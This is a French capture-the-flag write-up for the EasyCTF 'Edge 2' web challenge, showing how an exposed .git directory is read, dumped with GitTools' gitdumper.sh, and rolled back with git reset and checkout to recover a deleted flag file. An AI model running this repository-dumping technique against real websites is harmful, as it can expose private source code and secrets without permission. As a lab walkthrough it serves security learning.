**Web - Edge -2  - 200pts**

![Alt](img/edge-1.png "Edge 1")


Résolution :

Le dossier git à "censé" été sécurisé , voyons cela :

Cependant si on accède directement au fichier on obtient le contenu :

```BASH
http://edge2.web.easyctf.com/.git/logs/HEAD


0000000000000000000000000000000000000000 15ca375e54f056a576905b41a417b413c57df6eb root <root@dfc2eabdf236.(none)> 1455532500 +0000  clone: from https://github.com/fermayo/hello-world-lamp.git
15ca375e54f056a576905b41a417b413c57df6eb 26e35470d38c4d6815bc4426a862d5399f04865c Michael <michael@easyctf.com> 1489390329 +0000  commit: Initial.
26e35470d38c4d6815bc4426a862d5399f04865c 6b4131bb3b84e9446218359414d636bda782d097 Michael <michael@easyctf.com> 1489390330 +0000  commit: Whoops! Remove flag.
6b4131bb3b84e9446218359414d636bda782d097 a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd Michael <michael@easyctf.com> 1489390332 +0000  commit: Prevent directory listing.
```

On utilise  [GitTools](https://github.com/internetwache/GitTools) Pour récupérer le contenu

```BASH
./gitdumper.sh http://edge2.web.easyctf.com/.git/ easyctf 
```

On affiche l'historique des commit pour retrouver le fichier contenant le flag :

```BASH
git log

commit 26e35470d38c4d6815bc4426a862d5399f04865c
Author: Michael <michael@easyctf.com>
Date:   Mon Mar 13 07:32:09 2017 +0000

    Initial.

commit 15ca375e54f056a576905b41a417b413c57df6eb
Author: Fernando <fermayo@gmail.com>
Date:   Sat Dec 14 12:50:09 2013 -0300

    initial version

commit 8ac4f76df2ce8db696d75f5f146f4047a315af22
Author: Fernando Mayo <fermayo@gmail.com>
Date:   Sat Dec 14 07:36:18 2013 -0800

    Initial commit
(END)
```
On reset sur le commit qui nous intérresse :

```BASH
git reset 26e35470d38c4d6815bc4426a862d5399f04865c

Modifications non indexées après reset :
D css/bootstrap.css
D css/bootstrap.min.css
D flag.txt
D fonts/glyphicons-halflings-regular.eot
D fonts/glyphicons-halflings-regular.svg
D fonts/glyphicons-halflings-regular.ttf
D fonts/glyphicons-halflings-regular.woff
D fonts/glyphicons-halflings-regular.woff2
D js/bootstrap.js
D js/bootstrap.min.js
D js/jquery.js

```

```BASH
git status

Sur la branche master
Votre branche est en avance sur 'origin/master' de 1 commit.

  supprimé :        css/bootstrap.css
  supprimé :        css/bootstrap.min.css
  supprimé :        flag.txt
  supprimé :        fonts/glyphicons-halflings-regular.eot
  supprimé :        fonts/glyphicons-halflings-regular.svg
  supprimé :        fonts/glyphicons-halflings-regular.ttf
  supprimé :        fonts/glyphicons-halflings-regular.woff
  supprimé :        fonts/glyphicons-halflings-regular.woff2
  supprimé :        js/bootstrap.js
  supprimé :        js/bootstrap.min.js
  supprimé :        js/jquery.js
```

On récupère notre fichier flag.txt

```BASH
git checkout flag.txt
```

On affiche le flag :

```BASH
cat flag.txt 

easyctf{hiding_the_problem_doesn't_mean_it's_gone!}
```


By team Beers4Flags


```
 ________
|        |
|  #BFF  |
|________|
   _.._,_|,_
  (      |   )
   ]~,"-.-~~[
 .=] Beers ([
 | ])  4   ([
 '=]) Flags [
   |:: '    |
    ~~----~~
```
